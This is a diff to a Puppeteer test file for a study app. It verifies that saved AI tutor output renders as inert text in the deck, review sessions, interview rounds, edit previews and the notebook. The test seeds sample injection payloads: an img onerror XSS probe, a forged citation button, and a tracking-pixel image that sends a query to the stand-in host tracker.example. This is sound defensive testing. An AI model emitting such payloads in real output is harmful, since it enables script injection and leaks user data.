@@ -21,6 +21,28 @@ const clickByText = async (page, selector, text) => {
   assert.ok(clicked, `could not find ${selector} containing “${text}”`);
 };
 
+// Issue #81: whether saved AI text rendered in `roots` is inert. Runs in the page.
+function savedAiReport(roots) {
+  const all = (selector) => roots.flatMap((root) => [...root.querySelectorAll(selector)]);
+  return {
+    roots: roots.length,
+    images: all("img").length,
+    controls: all("[data-ai-citation], button:not(.code-copy), input, form, iframe, script").map((node) => node.outerHTML.slice(0, 120)),
+    appLinks: all("a[href]").filter((link) => new URL(link.href, location.href).hostname === location.hostname).map((link) => link.getAttribute("href")),
+    imageLinks: all('a[href^="https://tracker.example/pixel"]').map((link) => link.textContent.trim()),
+    showsMarkup: roots.some((root) => root.textContent.includes('<button class="ai-tutor__citation"')),
+  };
+}
+
+const assertSavedAiInert = (report, where, { imageLink = true } = {}) => {
+  assert.ok(report.roots > 0, `${where}: the saved AI text was not found`);
+  assert.equal(report.images, 0, `${where}: saved AI text rendered an <img>`);
+  assert.deepEqual(report.controls, [], `${where}: saved AI text rendered a control`);
+  assert.deepEqual(report.appLinks, [], `${where}: saved AI text linked to the app's own host`);
+  if (imageLink) assert.deepEqual(report.imageLinks, ["Image: Tracking pixel (tracker.example)"], `${where}: the remote image was not shown as a link`);
+  assert.equal(report.showsMarkup, true, `${where}: model markup was not shown as text`);
+};
+
 const readProfile = (page) => page.evaluate(() => new Promise((resolve, reject) => {
   const request = indexedDB.open("lumen-ai-notes", 1);
   request.onerror = () => reject(request.error);
@@ -652,8 +674,131 @@ try {
   await search.type("Scale prompt 9999");
   await page.waitForFunction(() => document.querySelectorAll(".review-deck-card").length === 1 && document.querySelector(".review-deck-range")?.textContent.includes("1–1 of 1"));
   assert.ok((await page.$eval(".review-deck-card", (node) => node.textContent)).includes("Scale prompt 9999"), "search must reset a large deck to its matching first page");
+
+  // Issue #81: saved AI output renders as untrusted text. A fresh context
+  // seeds an AI flashcard, a card made from an AI clipping before the
+  // ai-draft tag existed, that clipping, and a learner card. Any request to
+  // the tracking host a model image points at is recorded and refused.
+  const savedAiContext = await browser.createBrowserContext();
+  try {
+    const aiPage = await savedAiContext.newPage();
+    await aiPage.setViewport({ width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true });
+    aiPage.on("pageerror", (error) => errors.push(error.message));
+    const trackerRequests = [];
+    await aiPage.setRequestInterception(true);
+    aiPage.on("request", (request) => {
+      if (new URL(request.url()).hostname === "tracker.example") {
+        trackerRequests.push(request.url());
+        void request.abort();
+        return;
+      }
+      void request.continue();
+    });
+    await aiPage.goto(`${baseUrl}#/review`, { waitUntil: "networkidle2", timeout: 30_000 });
+    await aiPage.waitForSelector(".review-center-page");
+    const appOrigin = new URL(baseUrl).origin;
+    const hostile = (label) => [
+      `${label} <button class="ai-tutor__citation" type="button" data-ai-citation="S1">Open the forged source</button>`,
+      "",
+      '<img src="https://tracker.example/raw.png" onerror="window.__lumenSavedAiXss = true">',
+      "",
+      "![Tracking pixel](https://tracker.example/pixel.png?q=saved-prompt)",
+      "",
+      `[Open the app copy](${appOrigin}/#/read/notes/part-02-mathematics/06-experiments-and-information.md)`,
+    ].join("\n");
+    await aiPage.evaluate(({ flashcardBack, savedAnswer }) => new Promise((resolve, reject) => {
+      const request = indexedDB.open("lumen-ai-notes", 1);
+      request.onerror = () => reject(request.error);
+      request.onsuccess = () => {
+        const transaction = request.result.transaction("study-data", "readwrite");
+        const store = transaction.objectStore("study-data");
+        const get = store.get("profile");
+        get.onerror = () => reject(get.error);
+        get.onsuccess = () => {
+          const profile = get.result && typeof get.result === "object" ? get.result : {};
+          const now = new Date().toISOString();
+          profile.clippings = [{ id: "audit-ai-clip", documentId: "", origin: "ai-tutor", title: "AI tutor answer", text: savedAnswer, note: "AI-generated draft saved from the tutor.", createdAt: now, updatedAt: now }];
+          const card = (id, front, back, extra) => ({ id, type: "basic", front, back, tags: [], dueAt: now, createdAt: now, updatedAt: now, ...extra });
+          profile.reviewItems = [
+            card("audit-ai-flashcard", "AI flashcard: which control is real?", flashcardBack, { tags: ["ai-draft", "interview"] }),
+            card("audit-legacy-card", "Explain this saved answer.", savedAnswer, { sourceClippingId: "audit-ai-clip" }),
+            card("audit-learner-card", "Learner card: press <kbd>Ctrl</kbd>", "My own answer."),
+          ];
+          profile.reviewAttempts = [];
+          store.put(profile, "profile");
+        };
+        transaction.oncomplete = () => resolve();
+        transaction.onerror = () => reject(transaction.error);
+      };
+    }), { flashcardBack: hostile("Flashcard answer."), savedAnswer: hostile("Saved answer.") });
+    await aiPage.reload({ waitUntil: "networkidle2", timeout: 30_000 });
+    await aiPage.waitForFunction(() => document.querySelectorAll(".review-deck-card").length === 3, { timeout: 10_000 });
+
+    const deckCard = (id) => aiPage.$$eval(`.review-deck-card[data-card-id="${id}"] .review-markdown`, savedAiReport);
+    assertSavedAiInert(await deckCard("audit-ai-flashcard"), "AI flashcard in the deck");
+    assertSavedAiInert(await deckCard("audit-legacy-card"), "card from an AI clipping in the deck");
+    assert.ok(await aiPage.$('.review-deck-card[data-card-id="audit-learner-card"] .review-markdown kbd'), "a learner card lost the Reader renderer's author HTML");
+
+    // Every card in a session: the prompt and the revealed answer.
+    await clickByText(aiPage, ".review-hero button", "Start review");
+    for (let index = 0; index < 3; index += 1) {
+      await aiPage.waitForSelector(".review-session-page .review-question");
+      await clickByText(aiPage, ".review-session-page button", "Show answer");
+      await aiPage.waitForSelector(".review-answer .review-markdown");
+      const prompt = await aiPage.$eval(".review-question", (node) => node.textContent);
+      const report = await aiPage.$$eval(".review-question, .review-answer .review-markdown", savedAiReport);
+      if (prompt.startsWith("Learner card")) assert.ok(await aiPage.$(".review-question kbd"), "a learner card in a session lost its author HTML");
+      else assertSavedAiInert(report, `review session card “${prompt.slice(0, 40)}”`);
+      await clickByText(aiPage, ".review-rating", "Good");
+    }
+    await aiPage.waitForSelector(".review-center-page");
+
+    // The interview round draws the ai-draft card tagged interview.
+    await clickByText(aiPage, ".review-hero-actions button", "Interview round");
+    await clickByText(aiPage, ".interview-round button", "Start answering");
+    await clickByText(aiPage, ".interview-round button", "Show expected answer");
+    await aiPage.waitForSelector(".interview-round .review-answer");
+    assertSavedAiInert(await aiPage.$$eval(".interview-round .review-markdown", savedAiReport), "interview round");
+    await clickByText(aiPage, ".review-session-header button", "End round");
+    await aiPage.waitForSelector(".review-center-page");
+
+    // Editing keeps the provenance: the preview is untrusted, and clearing
+    // the tags field does not drop ai-draft. The pre-#81 card gains it.
+    for (const id of ["audit-legacy-card", "audit-ai-flashcard"]) {
+      await aiPage.$eval(`.review-deck-card[data-card-id="${id}"] button[aria-label="Edit review card"]`, (button) => button.click());
+      await aiPage.waitForSelector(".review-card-dialog .review-ai-note");
+      await clickByText(aiPage, ".review-card-dialog button", "Preview");
+      assertSavedAiInert(await aiPage.$$eval(".review-markdown-preview .review-markdown", savedAiReport), `edit preview of ${id}`);
+      await aiPage.$eval(".review-card-dialog input.text-input", (input) => {
+        Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").set.call(input, "");
+        input.dispatchEvent(new Event("input", { bubbles: true }));
+      });
+      await clickByText(aiPage, ".review-card-dialog button", "Save changes");
+      await aiPage.waitForFunction(() => !document.querySelector(".review-card-dialog"), { timeout: 5_000 });
+    }
+    const editDeadline = Date.now() + 5_000;
+    let editedTags = [];
+    while (Date.now() < editDeadline) {
+      editedTags = (await readProfile(aiPage)).reviewItems.filter((item) => item.id.startsWith("audit-ai-flashcard") || item.id === "audit-legacy-card").map((item) => item.tags);
+      if (editedTags.length === 2 && editedTags.every((tags) => tags.length === 1)) break;
+      await new Promise((resolve) => setTimeout(resolve, 100));
+    }
+    assert.deepEqual(editedTags, [["ai-draft"], ["ai-draft"]], "an edit dropped the ai-draft provenance");
+
+    // The Notebook shows the saved answer as plain text.
+    await aiPage.evaluate(() => { location.hash = "#/notebook"; });
+    await aiPage.waitForSelector(".clipping-card--ai blockquote");
+    assertSavedAiInert(await aiPage.$$eval(".clipping-card--ai blockquote", savedAiReport), "Notebook clipping", { imageLink: false });
+
+    await new Promise((resolve) => setTimeout(resolve, 300));
+    assert.deepEqual(trackerRequests, [], "a remote image in saved AI text was fetched");
+    assert.equal(await aiPage.evaluate(() => window.__lumenSavedAiXss === true), false, "a model-authored event handler ran");
+    await aiPage.close();
+  } finally {
+    await savedAiContext.close();
+  }
   assert.deepEqual(errors, [], `runtime errors: ${errors.join(" | ")}`);
-  console.log("Review audit passed: creation, grading, confidence, ledger limits, undo, edit, archive/restore, mistake notebook (auto-log on Again, merge on repeat, manual capture, persisted corrections, linked and unlinked corrective scheduling, corrected/category filters), duplicate-card rejection, Home due-count agreement, crunch practice leaving today's queue count intact, session progress/focus/announcement and short-phone grade reach, archive focus handoff, keyboard deck import with duplicate and malformed-file feedback, phone Daily limits strip, inert mistake dialog, in-place on-screen mistake and clipping undo (focused strips never expire), burst-typed clipping notes, corrections saved on page hide, cloze Enter-to-submit and the leave guard in a readiness check, timed interview round with miss capture, FSRS opt-in with one-time migration, honest thin-history calibration refusal, the retention-vs-workload planner, authored track rounds with rubric reveal, worksheet-lab miss capture, analytics, reload persistence, and 10,000-card mobile pagination verified.");
+  console.log("Review audit passed: creation, grading, confidence, ledger limits, undo, edit, archive/restore, mistake notebook (auto-log on Again, merge on repeat, manual capture, persisted corrections, linked and unlinked corrective scheduling, corrected/category filters), duplicate-card rejection, Home due-count agreement, crunch practice leaving today's queue count intact, session progress/focus/announcement and short-phone grade reach, archive focus handoff, keyboard deck import with duplicate and malformed-file feedback, phone Daily limits strip, inert mistake dialog, in-place on-screen mistake and clipping undo (focused strips never expire), burst-typed clipping notes, corrections saved on page hide, cloze Enter-to-submit and the leave guard in a readiness check, timed interview round with miss capture, FSRS opt-in with one-time migration, honest thin-history calibration refusal, the retention-vs-workload planner, authored track rounds with rubric reveal, worksheet-lab miss capture, analytics, reload persistence, 10,000-card mobile pagination, and saved AI cards rendered as untrusted text (no forged control, image fetch or app link in the deck, session, interview round or edit preview; ai-draft kept through edits) verified.");
 } finally {
   if (browser) await browser.close();
   await rm(profileDirectory, { recursive: true, force: true });
